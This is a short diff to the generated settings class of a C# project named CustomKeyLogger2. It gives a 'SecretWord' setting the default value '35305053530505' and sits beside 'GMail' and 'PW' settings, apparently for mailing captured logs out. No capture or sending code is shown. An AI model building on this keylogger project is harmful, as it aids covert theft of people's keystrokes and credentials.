@@ -37,6 +37,18 @@ namespace CustomKeyLogger2.Properties {
         
         [global::System.Configuration.UserScopedSettingAttribute()]
         [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        [global::System.Configuration.DefaultSettingValueAttribute("35305053530505")]
+        public string SecretWord {
+            get {
+                return ((string)(this["SecretWord"]));
+            }
+            set {
+                this["SecretWord"] = value;
+            }
+        }
+        
+        [global::System.Configuration.UserScopedSettingAttribute()]
+        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
         [global::System.Configuration.DefaultSettingValueAttribute("")]
         public string GMail {
             get {
@@ -56,18 +68,6 @@ namespace CustomKeyLogger2.Properties {
             }
             set {
                 this["PW"] = value;
-            }
-        }
-        
-        [global::System.Configuration.UserScopedSettingAttribute()]
-        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
-        [global::System.Configuration.DefaultSettingValueAttribute("")]
-        public string SecretWord {
-            get {
-                return ((string)(this["SecretWord"]));
-            }
-            set {
-                this["SecretWord"] = value;
             }
         }
     }
